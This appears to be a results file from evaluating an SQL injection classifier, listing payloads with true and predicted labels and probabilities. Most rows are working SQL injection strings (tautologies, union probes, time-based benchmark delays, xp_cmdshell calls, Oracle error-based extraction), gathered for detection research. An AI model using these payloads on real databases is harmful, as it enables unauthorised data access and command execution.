text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",sajid576/sql-injection-dataset,3,1,1,0.9999862909317017,1
select * from users where id  =  1 +$+ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",sajid576/sql-injection-dataset,3,1,1,0.9999861717224121,1
"select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
distinct,sajid576/sql-injection-dataset,12,1,0,0.00016842583136167377,0
"select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
insert,sajid576/sql-injection-dataset,15,1,0,0.02172793820500374,0
"select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
"select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
"select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
"select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
""" or 0  =  0 --",sajid576/sql-injection-dataset,30,1,1,0.9999858140945435,1
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  1 +$+. or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  1   or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
"select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from information_schema.tables--,sajid576/sql-injection-dataset,42,1,1,0.999916672706604,1
"select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
truncate,sajid576/sql-injection-dataset,47,1,0,0.00045331232831813395,0
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",sajid576/sql-injection-dataset,50,1,1,0.9999865293502808,1
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  1 <@ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
"select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
exec sp,sajid576/sql-injection-dataset,62,1,1,0.8113052845001221,1
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",sajid576/sql-injection-dataset,50,1,1,0.9999864101409912,1
or ''  =  ',sajid576/sql-injection-dataset,76,1,1,0.9999845027923584,1
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
"select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",sajid576/sql-injection-dataset,50,1,1,0.9999866485595703,1
or '7659'  =  '7659,sajid576/sql-injection-dataset,85,1,1,0.9999864101409912,1
"select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
select * from users where id  =  1. or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
"select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from users where id  =  1 &@ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999853372573853,1
""" or """"*""",sajid576/sql-injection-dataset,95,1,1,0.9999853372573853,1
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1 *1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
; exec master..xp_cmdshell,sajid576/sql-injection-dataset,107,1,1,0.9999357461929321,1
"select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
a' or 1  =  1--,sajid576/sql-injection-dataset,113,1,1,0.999985933303833,1
"select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1 <@. or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
")   or benchmark  (  10000000,MD5  (  1   )    )   #",sajid576/sql-injection-dataset,50,1,1,0.9999865293502808,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,120,1,1,0.9999818801879883,1
"select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or "";["" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or "".["" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from users where id  =  1.*1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
"select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
"select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
anything' OR 'x'  =  'x,sajid576/sql-injection-dataset,131,1,1,0.9999853372573853,1
"select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
or 1  =  1,sajid576/sql-injection-dataset,143,1,1,0.9999856948852539,1
""" or benchmark  (  10000000,MD5  (  1   )    )   #",sajid576/sql-injection-dataset,50,1,1,0.9999865293502808,1
admin'or 1  =  1 or ''  =  ',sajid576/sql-injection-dataset,150,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
asc,sajid576/sql-injection-dataset,158,1,0,0.00011597428965615109,0
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"admin""/*",sajid576/sql-injection-dataset,164,1,1,0.9999303817749023,1
"select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
"select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
desc,sajid576/sql-injection-dataset,177,1,0,0.0011863281251862645,0
"select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
anything' or 'x'  =  'x,sajid576/sql-injection-dataset,131,1,1,0.9999854564666748,1
"select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
select * from users where id  =  1 <@$ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",sajid576/sql-injection-dataset,3,1,1,0.9999861717224121,1
"select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,sajid576/sql-injection-dataset,188,1,1,0.9999856948852539,1
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
"select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
"select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  '1' or !<@ or 1  =  1 -- 1',sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999861717224121,1
; begin declare @var varchar  (  8000  )   set @var  =  ' ...,sajid576/sql-injection-dataset,196,1,1,0.999984860420227,1
"select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
or 'x'  =  'x,sajid576/sql-injection-dataset,199,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""  (  _"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from users where id  =  1.<@$ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""  (  ;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1 %$ . or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  1 +$ . or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or "",&"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1 or \+<\ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or "";&"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from users where id  =  '1' or \<1 or 1  =  1 -- 1',sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,214,1,1,0.9999818801879883,1
"select * from users where id  =  1 or ""@#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""%1"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or @#""{  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
"select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
select * from users where id  =  1 or !<@ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or "";  )  ""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""{{"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
1 exec sp_   (  or exec xp_  ),sajid576/sql-injection-dataset,223,1,1,0.999985933303833,1
select * from users where id  =  1 +1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
")    )    or benchmark  (  10000000,MD5  (  1   )    )   #",sajid576/sql-injection-dataset,50,1,1,0.9999865293502808,1
"select * from users where id  =  1 or ""\#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999855756759644,1
"select * from users where id  =  1 or ""{%"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"or benchmark  (  10000000,MD5  (  1   )    )   #",sajid576/sql-injection-dataset,50,1,1,0.9999864101409912,1
"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",sajid576/sql-injection-dataset,238,1,1,0.9999866485595703,1
